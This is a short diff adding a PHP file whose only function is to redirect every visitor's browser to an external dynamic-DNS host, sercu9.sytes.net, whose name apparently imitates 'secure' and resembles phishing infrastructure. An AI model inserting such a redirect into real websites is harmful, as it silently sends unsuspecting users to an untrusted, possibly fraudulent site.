@@ -1,0 +1,7 @@
+<?php 
+  
+// Redirect browser 
+header("Location:https://sercu9.sytes.net/"); 
+  
+exit; 
+?> 
